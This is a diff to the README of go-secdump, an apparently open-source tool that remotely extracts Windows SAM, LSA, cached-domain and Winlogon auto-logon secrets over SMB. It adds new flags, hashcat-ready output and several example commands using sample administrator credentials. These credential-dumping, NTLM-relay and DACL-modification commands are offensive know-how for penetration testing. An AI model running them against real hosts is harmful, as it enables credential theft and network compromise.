@@ -49,42 +49,57 @@ https://www.synacktiv.com/publications/lsa-secrets-revisiting-secretsdump
 Usage: ./go-secdump [options]
 
 options:
-      --host <target>       Hostname or ip address of remote server. Must be hostname when using Kerberos
-  -P, --port <port>         SMB Port (default 445)
-  -d, --domain <domain>     Domain name to use for login
-  -u, --user <username>     Username
-  -p, --pass <pass>         Password
-  -n, --no-pass             Disable password prompt and send no credentials
-      --hash <NT Hash>      Hex encoded NT Hash for user password
-      --local               Authenticate as a local user instead of domain user
-  -k, --kerberos            Use Kerberos authentication. (KRB5CCNAME will be checked on Linux)
-      --dc-ip               Optionally specify ip of KDC when using Kerberos authentication
-      --target-ip           Optionally specify ip of target when using Kerberos authentication
-      --aes-key             Use a hex encoded AES128/256 key for Kerberos authentication
-      --dump                Saves the SAM and SECURITY hives to disk and
-                            transfers them to the local machine.
-      --sam                 Extract secrets from the SAM hive explicitly. Only other explicit targets are included.
-      --lsa                 Extract LSA secrets explicitly. Only other explicit targets are included.
-      --dcc2                Extract DCC2 caches explicitly. Only ohter explicit targets are included.
-      --modify-dacl         Change DACLs of reg keys before dump.
-                            Only required if keys cannot be opened using SeBackupPrivilege. (default false)
-      --backup-dacl         Save original DACLs to disk before modification
-      --restore-dacl        Restore DACLs using disk backup. Could be useful if automated restore fails.
-      --backup-file         Filename for DACL backup (default dacl.backup)
-      --relay               Start an SMB listener that will relay incoming
-                            NTLM authentications to the remote server and
-                            use that connection. NOTE that this forces SMB 2.1
-                            without encryption.
-      --relay-port <port>   Listening port for relay (default 445)
-      --socks-host <target> Establish connection via a SOCKS5 proxy server
-      --socks-port <port>   SOCKS5 proxy port (default 1080)
-  -t, --timeout             Dial timeout in seconds (default 5)
-      --noenc               Disable smb encryption
-      --smb2                Force smb 2.1
-      --debug               Enable debug logging
-      --verbose             Enable verbose logging
-  -o, --output              Filename for writing results (default is stdout). Will append to file if it exists.
-  -v, --version             Show version
+      --host <target>        Hostname or ip address of remote server. Must be hostname when using Kerberos
+  -P, --port <port>          SMB Port (default 445)
+  -d, --domain <domain>      Domain name to use for login
+  -u, --user <username>      Username
+  -p, --pass <pass>          Password
+  -n, --no-pass              Disable password prompt and send no credentials
+      --hash <NT Hash>       Hex encoded NT Hash for user password
+      --local                Authenticate as a local user instead of domain user
+  -k, --kerberos             Use Kerberos authentication. (KRB5CCNAME will be checked on Linux)
+      --dc-ip <ip>           Optionally specify ip of KDC when using Kerberos authentication
+      --target-ip <ip>       Optionally specify ip of target when using Kerberos authentication
+      --aes-key <hex>        Use a hex encoded AES128/256 key for Kerberos authentication
+      --dns-host <ip[:port]> Override system's default DNS resolver
+      --dns-tcp              Force DNS lookups over TCP. Default true when using --socks-host
+      --dump                 Saves the SAM and SECURITY hives to disk and
+                             transfers them to the local machine.
+      --sam                  Extract secrets from the SAM hive explicitly. Only other explicit targets are included.
+      --lsa                  Extract LSA secrets explicitly. Only other explicit targets are included.
+      --dcc2                 Extract DCC2 caches explicitly. Only other explicit targets are included.
+      --misc                 Extract misc registry secrets such as the Winlogon
+                             DefaultPassword explicitly. Only other explicit targets are included.
+      --modify-dacl          Change DACLs of reg keys before dump.
+                             Only required if keys cannot be opened using SeBackupPrivilege. (default false)
+      --backup-dacl          Save original DACLs to disk before modification
+      --restore-dacl         Restore DACLs using disk backup. Could be useful if automated restore fails.
+      --backup-file <file>   Filename for DACL backup (default dacl.backup)
+      --relay                Start an SMB listener that will relay incoming
+                             NTLM authentications to the remote server and
+                             use that connection. NOTE that this forces SMB 2.1
+                             without encryption.
+      --relay-port <port>    Listening port for relay (default 445)
+      --socks-host <target>  Establish connection via a SOCKS5 proxy server
+      --socks-port <port>    SOCKS5 proxy port (default 1080)
+  -t, --timeout <duration>   Dial timeout in format 5s or 2m (default 5s)
+      --noenc                Disable smb encryption
+      --smb2                 Force smb 2.1
+      --debug                Enable debug logging. Bare --debug turns on every
+                             registered package; --debug=msrrp,smb turns on only the
+                             listed package-name suffixes (the '=' form is required
+                             for the filter).
+      --verbose              Enable verbose logging. Same filter syntax as --debug.
+                             --debug and --verbose may be combined with different
+                             filters; a package targeted by both gets the higher level.
+      --list-log-packages    List the registered log package names that can be
+                             targeted with --debug=<suffix> or --verbose=<suffix>,
+                             then exit
+  -o, --output <file>        Filename for writing results (default is stdout). Will append to file if it exists.
+      --output-format <fmt>  Output format: text (default), json, or hashcat
+      --history              Include historical (OldVal) LSA secrets in addition to current values
+  -q, --quiet                Suppress informational headers; print only secrets
+  -v, --version              Show version
 
 ```
 
@@ -110,12 +125,45 @@ or
 ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --sam --lsa --dcc2
 ```
 
-Dump only SAM, LSA, or DCC2 cache secrets
+Dump only SAM, LSA, DCC2 cache, or misc registry secrets
 
 ```
 ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --sam
 ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --lsa
 ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --dcc2
+./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --misc
+```
+
+The `--misc` target extracts miscellaneous registry secrets that don't belong to
+the SAM/LSA/DCC2 hives, currently the Winlogon auto-logon `DefaultPassword` (and
+the associated `DefaultUserName`) when present.
+
+### Historical LSA secrets, output formats, and quiet mode
+
+Include historical (`OldVal`) LSA secrets in addition to the current values with
+`--history`. Write results to a file with `-o/--output` (appended if it exists)
+and choose how secrets are formatted with `--output-format`:
+
+- `text` (default) — human readable
+- `json` — a JSON array of typed records, useful for further processing
+- `hashcat` — bare NT hashes (mode 1000) and `$DCC2$` lines (mode 2100) ready to feed to hashcat
+
+Use `-q/--quiet` to suppress the informational headers and summary so only the
+secrets themselves are printed.
+
+```
+./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --history --output-format json -o secrets.json
+./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --output-format hashcat --quiet
+```
+
+### Per-package logging
+
+List the log package names that can be targeted, then enable debug or verbose
+logging for specific packages (matched by name suffix) instead of all of them:
+
+```
+./go-secdump --list-log-packages
+./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --debug=msrrp,smb
 ```
 
 ### NTLM Relaying
